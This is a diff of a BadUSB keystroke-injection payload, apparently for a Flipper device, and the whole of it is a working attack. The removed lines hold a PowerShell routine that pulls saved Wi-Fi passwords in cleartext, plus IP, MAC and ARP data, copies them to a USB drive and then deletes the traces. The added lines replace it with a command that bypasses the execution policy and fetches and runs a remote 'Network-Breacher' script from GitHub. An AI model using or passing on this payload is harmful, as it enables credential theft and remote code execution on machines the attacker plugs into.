@@ -1,19 +1,4 @@
-REM Title: WLAN + IP/MAC + Devices + Copy to USB-Silver
-DELAY 1000
 GUI r
-DELAY 500
-STRING powershell
-ENTER
-DELAY 2000
-STRING $wifi = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim(); $res=(netsh wlan show profile name="$n" key=clear); $p=($res | Select-String "inhalt" | %{$_.ToString().Split(":")[1].Trim()}); if($p){ "WLAN: $n | PW: $p" }};
-ENTER
-STRING $ipConfig = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -like '*Wi-Fi*' -or $_.InterfaceAlias -like '*Ethernet*'} | Select-Object -First 1; $ip = $ipConfig.IPAddress; $mac = (Get-NetAdapter | Where-Object {$_.InterfaceIndex -eq $ipConfig.InterfaceIndex}).MacAddress;
-ENTER
-STRING $arp = arp -a | Out-String;
-ENTER
-STRING $path = "$env:TEMP\Networkstats.txt"; "=== SYSTEM INFO ===`nIP: $ip`nMAC: $mac`n`n=== WLAN PROFILE & PW ===`n" + ($wifi -join "`n") + "`n`n=== FOUND DEVICES (ARP) ===`n$arp" > $path; notepad $path;
-ENTER
-STRING $usb = Get-Volume | Where-Object { $_.FileSystemLabel -eq "USB-Silver" }; if ($usb) { Copy-Item $path "$($usb.DriveLetter):\" -Force };
-ENTER
-STRING Start-Sleep -s 15; Remove-Item $path -ErrorAction SilentlyContinue; exit
+DELAY 800
+STRING powershell -NoP -Exec Bypass "irm https://raw.githubusercontent.com/Ertonbax/Flipper-BadUSB/refs/heads/main/Payloads/Network-Breacher.ps1 | iex"
 ENTER
